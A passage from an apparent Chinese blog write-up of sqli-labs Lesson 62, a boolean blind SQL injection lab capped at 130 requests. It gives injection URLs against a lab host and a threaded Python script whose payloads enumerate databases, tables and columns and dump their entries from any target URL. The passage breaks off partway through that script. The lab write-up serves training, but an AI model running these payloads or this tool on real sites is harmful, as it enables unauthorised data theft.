class=\"line\">                      help=<span class=\"string\">'Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-D'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'db'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-T'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'tbl'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table(s) to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-C'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'col'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table column(s) to enumerate, use like id,password'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--current-db'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'cudbs'</span>, help=<span class=\"string\">'Retrieve DBMS current database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dbs'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dbs'</span>, help=<span class=\"string\">'Enumerate ALL database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--tables'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'tables'</span>, help=<span class=\"string\">'Enumerate DBMS database tables'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--columns'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'columns'</span>, help=<span class=\"string\">'Enumerate DBMS database table columns'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dump'</span>, help=<span class=\"string\">'Dump DBMS database table entries'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump-all'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'all'</span>, help=<span class=\"string\">'Dump all DBMS databases tables entries'</span>)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> options.url <span class=\"keyword\">and</span> options.dbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        getdbname(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.cudbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        get_cu_db_name(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tables:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        get_table_name(url, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.col <span class=\"keyword\">and</span> options.dump):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        coname = options.col</span><br><span class=\"line\">        dump(url, tbname, dbname, coname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.all):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        dump(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.columns):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        parser.print_help()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>解决的思路方向,优化脚本。</p>\n<p>1.其中一项是secret_XXXX 后四位由 大写字母和数字 组成,可以只猜解后这四位<br>2.发现大小写字母和数字组成,可以缩小区域<br>3.优化算法..脚本中有些请求是不必要的<br>4.直接默认猜解challenges？</p>\n<p>暂时想到这么多…</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-62-GET-盲注-变化1-仅允许130次请求\"><a href=\"#sqli-labs-lession-62-GET-盲注-变化1-仅允许130次请求\" class=\"headerlink\" title=\"sqli-labs lession-62 GET-盲注-变化1-仅允许130次请求\"></a>sqli-labs lession-62 GET-盲注-变化1-仅允许130次请求</h1><hr>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p><code>http://10.60.17.35:8082/Less-62/?id=1&#39;)+and+1=1%23</code></p>\n<p><code>http://10.60.17.35:8082/Less-62/?id=1&#39;)+and+1=2%23</code></p>\n<p>构造闭合方式为表现不同,表现为布尔型注入。</p>\n<p>可以使用脚本代替手工测试。</p>\n<p>获取当前数据库名</p>\n<p><img src=\"/img/sql/Lesson-62/001.png\" alt=\"001\"></p>\n<p>获取表名</p>\n<p><img src=\"/img/sql/Lesson-62/002.png\" alt=\"002\"></p>\n<p>获取列名</p>\n<p><img src=\"/img/sql/Lesson-62/003.png\" alt=\"003\"></p>\n<p>获取秘钥</p>\n<p><img src=\"/img/sql/Lesson-62/004.png\" alt=\"004\"></p>\n<p>成功。</p>\n<p><img src=\"/img/sql/Lesson-62/005.png\" alt=\"005\"></p>\n<p>但是使用无论是脚本还是手注都会遇到一个问题,单个字符的猜解平均达到到8次请求,对脚本里用的取与法来说是正常的,但是在只能130次的情况下超出太多了,完整的一次流程达到630左右….</p>\n<h2 id=\"测试脚本\"><a href=\"#测试脚本\" class=\"headerlink\" title=\"测试脚本\"></a>测试脚本</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">from</span> optparse <span class=\"keyword\">import</span> OptionParser</span><br><span class=\"line\"></span><br><span class=\"line\">feature = <span class=\"string\">'Your Login name'</span></span><br><span class=\"line\">head = <span class=\"string\">\"')\"</span></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'user-agent'</span>: <span class=\"string\">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getpayload</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> url + payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binary_search_db</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    s = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        count = <span class=\"number\">0</span></span><br><span class=\"line\">        mid = <span class=\"number\">0</span></span><br><span class=\"line\">        low = <span class=\"number\">47</span></span><br><span class=\"line\">        high = <span class=\"number\">57</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt;= high:</span><br><span class=\"line\">            mid = int((low + high) / <span class=\"number\">2</span>)</span><br><span class=\"line\">            newpayload = payload % (i, mid)</span><br><span class=\"line\">            html = requests.get(getpayload(url, newpayload),</span><br><span class=\"line\">                                headers=headers).text</span><br><span class=\"line\">            <span class=\"keyword\">if</span> feature <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">                count += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> count != <span class=\"number\">0</span>:</span><br><span class=\"line\">            s = s + chr(int((low + high + <span class=\"number\">1</span>) / <span class=\"number\">2</span>))</span><br><span class=\"line\">            i = i + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> int(s)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_db_len</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT LENGTH(database())),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前数据库长度: %d'</span> % lenth)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_cu_db_name</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    lenth = get_db_len(url)</span><br><span class=\"line\">    dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" and ascii(substr((select database()),%d,1))\"</span> % (i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        dbname += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[*]'</span>, dbname)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbnum</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据库数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_db_len</span><span class=\"params\">(url, num)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取与法</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">and_method</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    two = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>, <span class=\"number\">16</span>, <span class=\"number\">32</span>, <span class=\"number\">64</span>, <span class=\"number\">128</span>]</span><br><span class=\"line\">    s = <span class=\"number\">0</span></span><br><span class=\"line\">    keys = []</span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    m = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(url, i, s)</span>:</span></span><br><span class=\"line\">        html = requests.get(url, headers=headers).text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> feature <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">            s = s | two[i]</span><br><span class=\"line\">            m.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        newpayload = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        newpayload = payload + <span class=\"string\">\"%26\"</span> + <span class=\"string\">\"%d=%d--+\"</span> % (two[i], two[i])</span><br><span class=\"line\">        keys.append(newpayload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread, args=(</span><br><span class=\"line\">            getpayload(url, keys[i]), i, s,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> m:</span><br><span class=\"line\">        s = s | i</span><br><span class=\"line\">    <span class=\"keyword\">return</span> chr(s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbname</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = getdbnum(url)</span><br><span class=\"line\">    lenth = get_all_db_len(url, num)</span><br><span class=\"line\">    dbs = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">                i, j)</span><br><span class=\"line\">            dbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">        print(dbname)</span><br><span class=\"line\">        dbs.append(dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'available databases [%s]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> db <span class=\"keyword\">in</span> dbs:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, db)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_num</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\"</span> % dbname</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据表数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_table_len</span><span 